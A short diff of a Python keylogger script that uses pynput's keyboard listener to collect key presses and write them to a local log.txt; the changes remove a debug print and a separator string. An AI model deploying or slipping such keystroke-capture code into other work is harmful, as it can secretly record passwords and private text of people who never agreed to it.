@@ -6,6 +6,7 @@ from pynput.keyboard import Key, Listener
 keys = []
 
 
+
 def on_press(key):
 
     keys.append(key)
@@ -18,13 +19,11 @@ def on_press(key):
 
 
 def write_file(keys):
-    print(keys)
     with open('log.txt','w') as f:
         for k in keys:
 
             k = str(k).replace("'","")
             f.write(k)
-            f.write('       ------      ')
 
 def on_release(key):
 
